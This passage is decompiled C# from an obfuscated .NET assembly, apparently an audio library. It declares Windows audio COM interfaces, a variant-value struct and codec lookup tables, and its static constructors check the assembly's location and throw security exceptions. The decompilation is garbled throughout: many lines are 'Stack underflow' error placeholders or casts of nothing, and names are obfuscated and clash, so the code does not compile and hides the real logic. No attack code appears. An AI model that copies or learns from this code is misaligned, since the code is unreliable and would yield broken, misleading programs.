				global::_0006._0015 obj = ((_0015)/*Error near IL_0019: Stack underflow*/)._0001;
				/*Error near IL_001e: Stack underflow*/(obj);
				this._0001 = null;
			}
		}
	}
}
namespace _0015
{
	internal sealed class _0013
	{
		internal readonly _001E._0012 _0001;

		public int Count
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0013)/*Error near IL_000c: Stack underflow*/)._0001._0001(out var result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		public _001D._0017 this[int _0002]
		{
			get
			{
				//IL_0029: Incompatible stack heights: 0 vs 1
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0013)/*Error near IL_0033: Stack underflow*/, (int)/*Error near IL_0033: Stack underflow*/);
				global::_0006._0012 obj = (global::_0006._0012)/*Error near IL_0007: Stack underflow*/;
				global::_0007._0097(_0001._0001(ref obj, out var obj2));
				return new _001D._0017(obj, obj2);
			}
		}

		public _001D._0017 this[global::_0006._0012 _0002]
		{
			get
			{
				//IL_0069: Incompatible stack heights: 0 vs 1
				//IL_006c: Incompatible stack heights: 0 vs 1
				for (int i = 0; i < Count; i++)
				{
					global::_0006._0012 obj = global::_0011._0018._0001((_0013)/*Error near IL_000e: Stack underflow*/, (int)/*Error near IL_000e: Stack underflow*/);
					if (_0094_0002._0004_0006(obj._0001, _0002._0001) && obj._0001 == _0002._0001)
					{
						global::_0007._0097(_0001._0001(ref obj, out var obj2));
						return new _001D._0017(obj, obj2);
					}
				}
				return null;
			}
		}

		internal _0013(_001E._0012 _0004_0092_0006)
		{
			_0001 = _0004_0092_0006;
		}

		static _0013()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001D
{
	internal sealed class _0017
	{
		private readonly global::_0006._0012 _0001;

		private global::_0019._001A _0001;

		public global::_0006._0012 Key => ((_0017)/*Error near IL_0007: Stack underflow*/)._0001;

		public object Value
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0017)/*Error near IL_0007: Stack underflow*/)._0001.Value;
				return (object)/*Error near IL_000a: Stack underflow*/;
			}
		}

		internal _0017(global::_0006._0012 _001B_0010, global::_0019._001A _009C_0008)
		{
			this._0001 = _001B_0010;
			_0001 = _009C_0008;
		}
	}
}
namespace _0019
{
	internal struct _0017
	{
		public Guid _0001;

		public bool _0001;

		public float _0001;

		public uint _0001;

		public float _0002;

		private unsafe void _0001()
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			Guid empty = Guid.Empty;
			((_0017*)(nint)/*Error near IL_000c: Stack underflow*/)->_0001 = empty;
			((_0017*)(nint)/*Error near IL_0014: Stack underflow*/)->_0001 = false;
			((_0017*)(nint)/*Error near IL_0020: Stack underflow*/)->_0001 = 0f;
			this._0001 = 0u;
			_0002 = 0f;
		}
	}
}
namespace _0080
{
	internal enum _0013
	{
		_0001 = -2004287487,
		_0002 = -2004287480,
		_0003 = -2004287478,
		_0004 = -2004287450
	}
}
namespace _0006
{
	internal static class _0013
	{
		public const int _0001 = 1;

		public const int _0002 = 2185;

		public static readonly int _0003;

		public static readonly int _0004;

		public static readonly int _0005;

		public static readonly int _0006;

		public static readonly int _0007;

		public static readonly int _0008;

		public static readonly int _000E;

		public static readonly int _000F;

		public static readonly int _0010;

		public static readonly int _0011;

		public static readonly int _0012;

		public static readonly int _0013;

		public static readonly int _0014;

		public static readonly int _0015;

		public static readonly int _0016;

		public static readonly int _0017;

		public static readonly int _0018;

		public static readonly int _0019;

		public static readonly int _001A;

		public static readonly int _001B;

		public static readonly int _001C;

		public static readonly int _001D;

		public static readonly int _001E;

		static _0013()
		{
			//IL_0247: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_024d: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0003 = global::_0011._0018._0001(1, 2185, 1);
			_0004 = global::_0011._0018._0001(1, 2185, 2);
			_0005 = global::_0011._0018._0001(1, 2185, 3);
			_0006 = global::_0011._0018._0001(1, 2185, 4);
			_0007 = global::_0011._0018._0001(1, 2185, 5);
			_0008 = global::_0011._0018._0001(1, 2185, 6);
			_000E = global::_0011._0018._0001(1, 2185, 7);
			_000F = global::_0011._0018._0001(1, 2185, 8);
			_0010 = global::_0011._0018._0001(1, 2185, 9);
			_0011 = global::_0011._0018._0001(1, 2185, 10);
			_0012 = global::_0011._0018._0001(1, 2185, 11);
			_0013 = global::_0011._0018._0001(1, 2185, 12);
			_0014 = global::_0011._0018._0001(1, 2185, 14);
			_0015 = global::_0011._0018._0001(1, 2185, 15);
			_0016 = global::_0011._0018._0001(1, 2185, 16);
			_0017 = global::_0011._0018._0001(1, 2185, 17);
			_0018 = global::_0011._0018._0001(1, 2185, 18);
			_0019 = global::_0011._0018._0001(1, 2185, 19);
			_001A = global::_0011._0018._0001(1, 2185, 20);
			_001B = global::_0011._0018._0001(1, 2185, 21);
			_001C = global::_0011._0018._0001(1, 2185, 22);
			_001D = global::_0011._0018._0001(1, 2185, 23);
			_001E = -2004287450;
		}
	}
}
namespace _0012
{
	[Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0010
	{
		int _0001(out IntPtr _0002, out int _0003, out global::_000F._000F _0004, out long _0005, out long _0006);

		int _0001(int _0002);

		int _0001(out int _0002);
	}
}
namespace _0019
{
	[Guid("CD63314F-3FBA-4a1b-812C-EF96358728E7")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0018
	{
		[PreserveSig]
		int _0001(out ulong _0002);

		[PreserveSig]
		int _0001(out ulong _0002, out ulong _0003);

		[PreserveSig]
		int _0001(out uint _0002);
	}
}
namespace _0018
{
	[Guid("6f49ff73-6727-49AC-A008-D98CF5E70048")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0016 : global::_0019._0018
	{
		[PreserveSig]
		int _0002(out ulong _0002, out ulong _0003);
	}
}
namespace _0012
{
	[ComImport]
	[Guid("F294ACFC-3146-4483-A7BF-ADDCA7C260E2")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0011
	{
		int _0001(int _0002, out IntPtr _0003);

		int _0001(int _0002, global::_000F._000F _0003);
	}
}
namespace _0018
{
	[Guid("F4B1A599-7266-4319-A8CA-E70ACB11E8CD")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	public interface _0017
	{
		[PreserveSig]
		int _0001(out global::_0008._0010 _0002);

		[PreserveSig]
		int _0001([MarshalAs(UnmanagedType.LPWStr)] out string _0002);

		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		[PreserveSig]
		int _0002([MarshalAs(UnmanagedType.LPWStr)] out string _0002);

		[PreserveSig]
		int _0002([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		[PreserveSig]
		int _0001(out Guid _0002);

		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		[PreserveSig]
		int _0001([In] global::_000F._0010 _0002);

		[PreserveSig]
		int _0002([In] global::_000F._0010 _0002);
	}
}
namespace _001C
{
	[Guid("bfb7ff88-7239-4fc9-8fa2-07c950be9c6d")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	public interface _0012 : global::_0018._0017
	{
		[PreserveSig]
		new int _0001(out global::_0008._0010 _0002);

		[PreserveSig]
		new int _0001([MarshalAs(UnmanagedType.LPWStr)] out string _0002);

		[PreserveSig]
		new int _0001([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		[PreserveSig]
		new int _0002([MarshalAs(UnmanagedType.LPWStr)] out string _0002);

		[PreserveSig]
		new int _0002([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		[PreserveSig]
		new int _0001(out Guid _0002);

		[PreserveSig]
		new int _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		[PreserveSig]
		new int _0001([In] global::_000F._0010 _0002);

		[PreserveSig]
		new int _0002([In] global::_000F._0010 _0002);

		[PreserveSig]
		int _0003([MarshalAs(UnmanagedType.LPWStr)] out string _0002);

		[PreserveSig]
		int _0004([MarshalAs(UnmanagedType.LPWStr)] out string _0002);

		[PreserveSig]
		int _0001(out uint _0002);

		[PreserveSig]
		int _0001();

		[PreserveSig]
		int _0001(bool _0002);
	}
}
namespace _0008
{
	[Guid("E2F5BB11-0570-40CA-ACDD-3AA01277DEE8")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _000F
	{
		int _0001(out int _0002);

		int _0001(int _0002, out _0018._0017 _0003);
	}
	internal enum _0010
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _0010
{
	internal enum _001A
	{
		_0001,
		_0002,
		_0003,
		_0004,
		_0005,
		_0006
	}
}
namespace _0003
{
	internal interface _0011
	{
		void _0001(float _0002, bool _0003);

		void _0001(string _0002);

		void _0002(string _0002);

		void _0001(uint _0002, IntPtr _0003, uint _0004);

		void _0001(ref Guid _0002);

		void _0001(global::_0008._0010 _0002);

		void _0001(global::_0010._001A _0002);
	}
}
namespace _0007
{
	[Guid("BFA971F1-4D5E-40BB-935E-967039BFBEE4")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0016
	{
		[PreserveSig]
		int _0001([Optional][In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.U4)] uint _0003, [MarshalAs(UnmanagedType.Interface)] out global::_0018._0017 _0004);

		[PreserveSig]
		int _0001([Optional][In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.U4)] uint _0003, [MarshalAs(UnmanagedType.Interface)] out global::_001F._0016 _0004);
	}
}
namespace _007F
{
	[Guid("77AA99A0-1BD6-484F-8BC7-2C654C9A9B6F")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0015 : global::_0007._0016
	{
		[PreserveSig]
		new int _0001([Optional][In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.U4)] uint _0003, [MarshalAs(UnmanagedType.Interface)] out global::_0018._0017 _0004);

		[PreserveSig]
		new int _0001([Optional][In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.U4)] uint _0003, [MarshalAs(UnmanagedType.Interface)] out _001F._0016 _0004);

		[PreserveSig]
		int _0001(out global::_0008._000F _0002);

		[PreserveSig]
		int _0001(global::_0017._001D _0002);

		[PreserveSig]
		int _0002(global::_0017._001D _0002);

		[PreserveSig]
		int _0001(string _0002, global::_0017._001D _0003);

		[PreserveSig]
		int _0001(IntPtr _0002);
	}
}
namespace _0014
{
	[Guid("93014887-242D-4068-8A15-CF5E93B90FE3")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0013
	{
		[PreserveSig]
		int _0001(out uint _0002);

		[PreserveSig]
		int _0001([In] uint _0002, [In] float _0003);

		[PreserveSig]
		int _0001([In] uint _0002, out float _0003);

		[PreserveSig]
		int _0001([In] uint _0002, [In][MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.R4, SizeParamIndex = 0)] float[] _0003);

		[PreserveSig]
		int _0002([In] uint _0002, [MarshalAs(UnmanagedType.LPArray)] float[] _0003);
	}
}
namespace _001F
{
	[Guid("87CE5498-68D6-44E5-9215-6DA47EF883D8")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0016
	{
		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.R4)] float _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		[PreserveSig]
		int _0001([MarshalAs(UnmanagedType.R4)] out float _0002);

		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.Bool)] bool _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		[PreserveSig]
		int _0001([MarshalAs(UnmanagedType.Bool)] out bool _0002);
	}
}
namespace _001B
{
	internal sealed class _0016
	{
	}
}
namespace _0019
{
	internal struct _0019
	{
		public int _0001;

		public IntPtr _0001;

		private unsafe void _0001()
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			((_0019*)(nint)/*Error near IL_0008: Stack underflow*/)->_0001 = 0;
			IntPtr zero = IntPtr.Zero;
			((_0019*)(nint)/*Error near IL_0014: Stack underflow*/)->_0001 = zero;
		}
	}
}
namespace _001F
{
	[Flags]
	internal enum _0017
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0x10,
		_0006 = 0x20,
		_0007 = 0x400,
		_0008 = 0x1000,
		_000E = 0x2000,
		_000F = 0x4000,
		_0010 = 0x8000,
		_0011 = 0x10000,
		_0012 = 0x20000,
		_0013 = 0x40000,
		_0014 = 0x80000,
		_0015 = 0x100000,
		_0016 = int.MinValue,
		_0017 = 3,
		_0018 = 0x15,
		_0019 = 0x17
	}
}
namespace _001A
{
	[ComImport]
	[Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0013
	{
		[PreserveSig]
		int _0001(global::_0003._000F _0002, global::_0005._0012 _0003, long _0004, long _0005, [In] global::_0005._0005 _0006, [In] ref Guid _0007);

		int _0001(out uint _0002);

		[return: MarshalAs(UnmanagedType.I8)]
		long _0001();

		int _0001(out int _0002);

		[PreserveSig]
		int _0001(global::_0003._000F _0002, [In] global::_0005._0005 _0003, IntPtr _0004);

		int _0001(out IntPtr _0002);

		int _0001(out long _0002, out long _0003);

		int _0001();

		int _0002();

		int _0003();

		int _0001(IntPtr _0002);

		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [MarshalAs(UnmanagedType.IUnknown)] out object _0003);
	}
}
namespace _0006
{
	[Guid("5CDF2C82-841E-4546-9722-0CF74078229A")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0014
	{
		int _0001(global::_0017._001C _0002);

		int _0002(global::_0017._001C _0002);

		int _0001(out int _0002);

		int _0001(float _0002, ref Guid _0003);

		int _0002(float _0002, ref Guid _0003);

		int _0001(out float _0002);

		int _0002(out float _0002);

		int _0001(uint _0002, float _0003, ref Guid _0004);

		int _0002(uint _0002, float _0003, ref Guid _0004);

		int _0001(uint _0002, out float _0003);

		int _0002(uint _0002, out float _0003);

		int _0001([MarshalAs(UnmanagedType.Bool)] bool _0002, ref Guid _0003);

		int _0001(out bool _0002);

		int _0001(out uint _0002, out uint _0003);

		int _0001(ref Guid _0002);

		int _0002(ref Guid _0002);

		int _0001(out uint _0002);

		int _0001(out float _0002, out float _0003, out float _0004);
	}
}
namespace _0002
{
	[Guid("C02216F6-8C67-4B5B-9D00-D008E73E0064")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0016
	{
		int _0001(out float _0002);

		int _0001(out int _0002);

		int _0001(int _0002, [In] IntPtr _0003);

		int _0002(out int _0002);
	}
}
namespace _0018
{
	[Guid("D666063F-1587-4E43-81F1-B948E807363F")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0018
	{
		int _0001(ref Guid _0002, _001F._0017 _0003, IntPtr _0004, [MarshalAs(UnmanagedType.IUnknown)] out object _0005);

		int _0001(global::_001C._0014 _0002, out _001E._0012 _0003);

		int _0001([MarshalAs(UnmanagedType.LPWStr)] out string _0002);

		int _0001(out global::_0003._0010 _0002);
	}
}
namespace _0017
{
	[Guid("0BD7A1BE-7A1A-44DB-8397-CC5392387B5E")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _001E
	{
		int _0001(out int _0002);

		int _0001(int _0002, out global::_0018._0018 _0003);
	}
}
namespace _0006
{
	[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0015
	{
		int _0001(global::_0016._0019 _0002, global::_0003._0010 _0003, out global::_0017._001E _0004);

		[PreserveSig]
		int _0001(global::_0016._0019 _0002, global::_0019._0016 _0003, out global::_0018._0018 _0004);

		int _0001(string _0002, out global::_0018._0018 _0003);

		int _0001(global::_001C._0013 _0002);

		int _0002(global::_001C._0013 _0002);
	}
}
namespace _0004
{
	[Guid("1BE09788-6894-4089-8586-9A2A6C265AC5")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0013
	{
		int _0001(out global::_0016._0019 _0002);
	}
}
namespace _001C
{
	[Guid("7991EEC9-7E89-4D85-8390-6C703CEC60C0")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	public interface _0013
	{
		void _0001([MarshalAs(UnmanagedType.LPWStr)] string _0002, [MarshalAs(UnmanagedType.I4)] global::_0003._0010 _0003);

		void _0001([MarshalAs(UnmanagedType.LPWStr)] string _0002);

		void _0002([MarshalAs(UnmanagedType.LPWStr)] string _0002);

		void _0001(global::_0016._0019 _0002, _0019._0016 _0003, [MarshalAs(UnmanagedType.LPWStr)] string _0004);

		void _0001([MarshalAs(UnmanagedType.LPWStr)] string _0002, global::_0006._0012 _0003);
	}
}
namespace _001E
{
	[Guid("886d8eeb-8cf2-4446-8d02-cdba1dbdcf99")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0012
	{
		int _0001(out int _0002);

		int _0001(int _0002, out global::_0006._0012 _0003);

		int _0001(ref global::_0006._0012 _0002, out _0019._001A _0003);

		int _0002(ref global::_0006._0012 _0002, ref _0019._001A _0003);

		int _0001();
	}
}
namespace _0007
{
	[ComImport]
	[Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
	internal sealed class _0017
	{
		[MethodImpl(MethodImplOptions.InternalCall)]
		public extern _0017();
	}
}
namespace _001C
{
	internal enum _0014
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _0019
{
	[StructLayout(LayoutKind.Explicit)]
	internal struct _001A
	{
		[FieldOffset(0)]
		private short m__0001;

		[FieldOffset(2)]
		private short _0002;

		[FieldOffset(4)]
		private short _0003;

		[FieldOffset(6)]
		private short _0004;

		[FieldOffset(8)]
		private sbyte m__0001;

		[FieldOffset(8)]
		private byte m__0001;

		[FieldOffset(8)]
		private short _0005;

		[FieldOffset(8)]
		private ushort m__0001;

		[FieldOffset(8)]
		private int m__0001;

		[FieldOffset(8)]
		private uint m__0001;

		[FieldOffset(8)]
		private int _0002;

		[FieldOffset(8)]
		private uint _0002;

		[FieldOffset(8)]
		private long m__0001;

		[FieldOffset(8)]
		private long _0002;

		[FieldOffset(8)]
		private float m__0001;

		[FieldOffset(8)]
		private double m__0001;

		[FieldOffset(8)]
		private short _0006;

		[FieldOffset(8)]
		private int _0003;

		[FieldOffset(8)]
		private DateTime m__0001;

		[FieldOffset(8)]
		private FILETIME m__0001;

		[FieldOffset(8)]
		private _0019 m__0001;

		[FieldOffset(8)]
		private IntPtr m__0001;

		public VarEnum DataType => (VarEnum)((_001A)/*Error near IL_0007: Stack underflow*/).m__0001;

		public unsafe object Value
		{
			get
			{
				//IL_0149: Incompatible stack heights: 0 vs 1
				//IL_0153: Incompatible stack heights: 0 vs 1
				_ = ((_001A*)/*Error near IL_0153: Stack underflow*/)->DataType;
				VarEnum varEnum = (VarEnum)/*Error near IL_0159: Stack underflow*/;
				switch (varEnum)
				{
				case VarEnum.VT_I1:
					return this.m__0001;
				case VarEnum.VT_I2:
					return _0005;
				case VarEnum.VT_I4:
					return this.m__0001;
				case VarEnum.VT_I8:
					return this.m__0001;
				case VarEnum.VT_INT:
					return _0005;
				case VarEnum.VT_UI4:
					return this.m__0001;
				case VarEnum.VT_UI8:
					return _0002;
				case VarEnum.VT_LPWSTR:
					return _0090_0003._008D_0007(this.m__0001);
				case VarEnum.VT_BLOB:
				case (VarEnum)4113:
					return this._0001();
				case VarEnum.VT_CLSID:
					return global::_0004._000F._0001<Guid>(this.m__0001);
				case VarEnum.VT_BOOL:
					return _0006 switch
					{
						-1 => true, 
						0 => false, 
						_ => throw new NotSupportedException(global::_0080._0014._0001(107405359)), 
					};
				default:
					throw new NotImplementedException(_0091_0003._008F_0007(global::_0080._0014._0001(107405334), varEnum));
				}
			}
		}

		public unsafe static _001A _0001(long _0002)
		{
			//IL_001e: Incompatible stack heights: 0 vs 2
			//IL_0021: Incompatible stack heights: 0 vs 1
			_001A obj = default(_001A);
			obj.m__0001 = 20;
			_ = ref obj;
			((_001A*)(nint)/*Error near IL_001a: Stack underflow*/)->_0001 = (long)/*Error near IL_001a: Stack underflow*/;
			return (_001A)/*Error near IL_001d: Stack underflow*/;
		}

		private unsafe byte[] _0001()
		{
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 2
			byte[] array = new byte[((_001A*)(nint)/*Error near IL_0007: Stack underflow*/)->_0001._0001];
			_ = _0011_0003._008D_0006;
			IntPtr intPtr = ((_001A*)(nint)/*Error near IL_001f: Stack underflow*/)->_0001._0001;
			IntPtr intPtr2 = (nint)array.LongLength;
			/*Error near IL_002e: Stack underflow*/(intPtr, array, 0, (int)(nint)intPtr2);
			return array;
		}

		public unsafe _0001[] _0001<_0001>()
		{
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00d0: Incompatible stack heights: 0 vs 1
			int num = ((_001A*)(nint)/*Error near IL_000a: Stack underflow*/)->_0001._0001;
			_ = typeof(_0001);
			int num2 = Marshal.SizeOf((object)(_0001)Activator.CreateInstance((Type)/*Error near IL_0023: Stack underflow*/));
			if (num % num2 != 0)
			{
				throw new InvalidDataException(string.Format(global::_0080._0014._0001(107405456), num, num2));
			}
			int num3 = num / num2;
			_0001[] array = new _0001[num3];
			for (int i = 0; i < num3; i++)
			{
				array[i] = (_0001)Activator.CreateInstance(typeof(_0001));
				Marshal.PtrToStructure(new IntPtr((long)this.m__0001._0001 + i * num2), (object)array[i]);
			}
			return array;
		}

		[Obsolete("Call with pointer instead")]
		public unsafe void _0001()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001(ref *(_001A*)/*Error near IL_000e: Stack underflow*/);
		}

		public static void _0001(IntPtr _0002)
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000e: Stack underflow*/);
		}
	}
}
namespace _001A
{
	internal sealed class _0014
	{
		internal static readonly short[] _0001;

		static _0014()
		{
			//IL_00d3: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00d9: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0001 = new short[256]
			{
				-5504, -5248, -6016, -5760, -4480, -4224, -4992, -4736, -7552, -7296,
				-8064, -7808, -6528, -6272, -7040, -6784, -2752, -2624, -3008, -2880,
				-2240, -2112, -2496, -2368, -3776, -3648, -4032, -3904, -3264, -3136,
				-3520, -3392, -22016, -20992, -24064, -23040, -17920, -16896, -19968, -18944,
				-30208, -29184, -32256, -31232, -26112, -25088, -28160, -27136, -11008, -10496,
				-12032, -11520, -8960, -8448, -9984, -9472, -15104, -14592, -16128, -15616,
				-13056, -12544, -14080, -13568, -344, -328, -376, -360, -280, -264,
				-312, -296, -472, -456, -504, -488, -408, -392, -440, -424,
				-88, -72, -120, -104, -24, -8, -56, -40, -216, -200,
				-248, -232, -152, -136, -184, -168, -1376, -1312, -1504, -1440,
				-1120, -1056, -1248, -1184, -1888, -1824, -2016, -1952, -1632, -1568,
				-1760, -1696, -688, -656, -752, -720, -560, -528, -624, -592,
				-944, -912, -1008, -976, -816, -784, -880, -848, 5504, 5248,
				6016, 5760, 4480, 4224, 4992, 4736, 7552, 7296, 8064, 7808,
				6528, 6272, 7040, 6784, 2752, 2624, 3008, 2880, 2240, 2112,
				2496, 2368, 3776, 3648, 4032, 3904, 3264, 3136, 3520, 3392,
				22016, 20992, 24064, 23040, 17920, 16896, 19968, 18944, 30208, 29184,
				32256, 31232, 26112, 25088, 28160, 27136, 11008, 10496, 12032, 11520,
				8960, 8448, 9984, 9472, 15104, 14592, 16128, 15616, 13056, 12544,
				14080, 13568, 344, 328, 376, 360, 280, 264, 312, 296,
				472, 456, 504, 488, 408, 392, 440, 424, 88, 72,
				120, 104, 24, 8, 56, 40, 216, 200, 248, 232,
				152, 136, 184, 168, 1376, 1312, 1504, 1440, 1120, 1056,
				1248, 1184, 1888, 1824, 2016, 1952, 1632, 1568, 1760, 1696,
				688, 656, 752, 720, 560, 528, 624, 592, 944, 912,
				1008, 976, 816, 784, 880, 848
			};
		}
	}
}
namespace _0004
{
	internal static class _0014
	{
		private const int _0001 = 132;

		private const int _0002 = 32635;

		internal static readonly byte[] _0001;

		static _0014()
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = new byte[128]
			{
				1, 1, 2, 2, 3, 3, 3, 3, 4, 4,
				4, 4, 4, 4, 4, 4, 5, 5, 5, 5,
				5, 5, 5, 5, 5, 5, 5, 5, 5, 5,
				5, 5, 6, 6, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7
			};
			_0001 = (byte[])/*Error near IL_0017: Stack underflow*/;
		}
	}
}
namespace _001D
{
	internal sealed class _0018
	{
		internal static readonly int[] _0001;

		internal static readonly int[] _0002;

		internal static readonly int[] _0003;

		internal static readonly int[] _0004;

		internal static readonly int[] _0005;

		internal static readonly int[] _0006;

		internal static readonly int[] _0007;

		internal static readonly int[] _0008;

		internal static readonly int[] _000E;

		internal static readonly int[] _000F;

		internal static readonly int[] _0010;

		internal static readonly int[] _0011;

		internal static readonly int[] _0012;

		internal static readonly int[] _0013;

		internal static readonly int[] _0014;

		static _0018()
		{
			//IL_0209: Incompatible stack heights: 0 vs 1
			bool flag;
			if (0 == 0)
			{
				flag = false;
			}
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_020f: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0001 = new int[8] { -60, -30, 58, 172, 334, 538, 1198, 3042 };
			_0002 = new int[16]
			{
				0, 7, 6, 5, 4, 3, 2, 1, 7, 6,
				5, 4, 3, 2, 1, 0
			};
			_0003 = new int[32]
			{
				2048, 2093, 2139, 2186, 2233, 2282, 2332, 2383, 2435, 2489,
